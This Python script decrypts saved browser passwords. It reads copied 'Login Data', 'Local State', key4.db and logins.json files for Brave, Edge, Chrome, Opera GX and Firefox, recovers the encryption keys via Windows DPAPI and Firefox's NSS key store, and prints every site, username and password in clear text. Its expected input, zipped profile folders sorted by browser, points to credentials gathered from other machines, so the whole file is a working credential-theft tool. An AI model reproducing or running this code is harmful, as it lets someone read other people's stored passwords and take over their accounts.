import argparse
import os
import json
import base64
import win32crypt
import sqlite3
import shutil
from Cryptodome.Cipher import AES
from pyasn1.codec.der import decoder
from Crypto.Cipher import DES3, AES
from Crypto.Util.number import long_to_bytes
from Crypto.Util.Padding import unpad   
from binascii import hexlify, unhexlify 
from hashlib import sha1, pbkdf2_hmac
from zipfile import ZipFile

argParser = argparse.ArgumentParser()
argParser.add_argument("-d", "--dir", help="directory with the files. For each browser there needs to be a folder.", required=True)

args = argParser.parse_args()
dir = args.dir

def extract_zips(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".zip"):
                file_path = os.path.join(root, file)
                with ZipFile(file_path, 'r') as zip_ref:
                    zip_ref.extractall(root)
                print(f"Extracted {file} in {root}")

extract_zips(dir)

brave_dir=f"{dir}/brave"
edge_dir=f"{dir}/edge"
chrome_dir=f"{dir}/chrome"
operagx_dir=f"{dir}/operagx"
firefox_dir=f"{dir}/firefox"

chromium_dirs=[brave_dir,edge_dir,chrome_dir,operagx_dir]
colors=["\x1b[0;37;43m","\x1b[0;37;44m","\x1b[0;37;42m","\x1b[0;37;41m"]

################################################################################
###############################  CHROMIUM  #####################################
################################################################################
def get_secret_key_chromium(browser_path):
    if(os.path.exists(browser_path)):
        pass_file = open(f"{browser_path}/Login Data", "rb")
        key_file = open(f"{browser_path}/Local State", "rb")
       
        local_state = key_file.read()
        local_state = json.loads(local_state)

        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        
        pass_file.close()
        key_file.close()
        return secret_key
        
        
def get_db_connection_chromium(browser_path):
    try:
        shutil.copy2(f"{browser_path}/Login Data", "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("[ERR] Chrome database cannot be found")
        return None
        
        
def decrypt_password_chromium(ciphertext, secret_key):
    try:
        
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)

        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        
        print("[ERR] Unable to decrypt.")
        return ""
       
def chromium_based_decryption(browser_path,color):

    secret_key = get_secret_key_chromium(browser_path)
    conn = get_db_connection_chromium(browser_path)
    
    if(secret_key and conn):
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        
        print_browser="| Browser: %s |"%(browser_path[browser_path.rfind("/"):][1:])
            
        print(color+"+"+"-"*(len(print_browser)-2)+"+"+"\x1b[0m")
        print(color+print_browser+"\x1b[0m")
        print(color+"+"+"-"*(len(print_browser)-2)+"+"+"\x1b[0m\n")
        
        for index,login in enumerate(cursor.fetchall()):
            
            url = login[0]
            username = login[1]
            ciphertext = login[2]
            
            if(url!="" and username!="" and ciphertext!=""):
                decrypted_password = decrypt_password_chromium(ciphertext, secret_key)
                
                print("\033[1m[Website URL]:\033[0m %s\n\033[1m[Username]\033[0m: %s\n\033[1m[Password]\033[0m: %s\n"%(url,username,decrypted_password))  
                
        cursor.close()
        conn.close()
        os.remove("Loginvault.db")    


################################################################################
###################################  FIREFOX  ##################################
################################################################################        
        
def decryptPBE(decodedItem, masterPassword, globalSalt):
  
    entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
    iterationCount = int(decodedItem[0][0][1][0][1][1])
    keyLength = int(decodedItem[0][0][1][0][1][2])
    assert keyLength == 32 

    k = sha1(globalSalt+masterPassword).digest()
    key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)    

    iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets() 
    # 04 is OCTETSTRING, 0x0e is length == 14
    cipherT = decodedItem[0][1].asOctets()
    clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)

    return clearText       
        
def getKey( masterPassword, directory ):  
    if os.path.exists(f"{firefox_dir}/key4.db"):
        conn = sqlite3.connect(f"{firefox_dir}/key4.db") #firefox 58.0.2 / NSS 3.35 with key4.db in SQLite
        c = conn.cursor()
        #first check password
        c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
        row = c.fetchone()
        globalSalt = row[0] #item1
        
        item2 = row[1]
        
        decodedItem2 = decoder.decode( item2 ) 
        clearText = decryptPBE( decodedItem2, masterPassword, globalSalt )
       
        if clearText == b'password-check\x02\x02': 
            c.execute("SELECT a11,a102 FROM nssPrivate;")
            for row in c:
                if row[0] != None:
                    break
            a11 = row[0] #CKA_VALUE
            a102 = row[1] 
            
            
            decoded_a11 = decoder.decode( a11 )
            #decrypt master key
            clearText = decryptPBE( decoded_a11, masterPassword, globalSalt )
            return clearText[:24]   
    else:
        print('cannot find key4.db')  
        return None, None        
        
def get_logins_firefox():

    logins = []
    #sqlite_file = options.directory / 'signons.sqlite' #LINUX
    json_file = f"{firefox_dir}/logins.json"
    if os.path.exists(json_file): 
        loginf = open(json_file, 'r').read()
        jsonLogins = json.loads(loginf)

        for row in jsonLogins['logins']:
            encUsername = row['encryptedUsername']
            encPassword = row['encryptedPassword']
            logins.append( (decodeLoginData(encUsername), decodeLoginData(encPassword), row['hostname']) )
        return logins
        
def decodeLoginData(data):
  
  asn1data = decoder.decode(base64.b64decode(data)) #first base64 decoding, then ASN1DERdecode
  key_id = asn1data[0][0].asOctets()
  iv = asn1data[0][1][1].asOctets()
  ciphertext = asn1data[0][2].asOctets()
  return key_id, iv, ciphertext 
    
def firefox_decryption():
    key = getKey(''.encode(), firefox_dir)
    logins = get_logins_firefox()
    if len(logins)==0:
        print ('no stored passwords')
    else:
        print_browser="| Browser: firefox |"
           
        print("\x1b[0;37;45m"+"+"+"-"*(len(print_browser)-2)+"+"+"\x1b[0m")
        print("\x1b[0;37;45m"+print_browser+"\x1b[0m")
        print("\x1b[0;37;45m"+"+"+"-"*(len(print_browser)-2)+"+"+"\x1b[0m\n")
        
        for i in logins:
            
            print ("\033[1m[Website URL]:\033[0m "+i[2])
            iv = i[0][1]
            ciphertext = i[0][2] 
            
            print ("\033[1m[Username]:\033[0m "+unpad( DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext),8 ).decode('utf-8'))
            
            iv = i[1][1]
            ciphertext = i[1][2]
            print ("\033[1m[Password]:\033[0m "+unpad( DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext),8 ).decode('utf-8')+"\n")
        
        
################################################################################
###################################  MAIN  #####################################
################################################################################        
    
if __name__ == '__main__':
    if(os.path.exists(f"{dir}")):
        try:
            for index, browser_path in enumerate(chromium_dirs):
                
                if(os.path.exists(f"{browser_path}/Login Data") and os.path.exists(f"{browser_path}/Local State")):
                    chromium_based_decryption(browser_path,colors[index])
                    
            if(os.path.exists(f"{firefox_dir}/key4.db") and os.path.exists(f"{firefox_dir}/logins.json")):
                firefox_decryption()
            
        except Exception as e:
            print("[ERR] %s"%str(e))
        
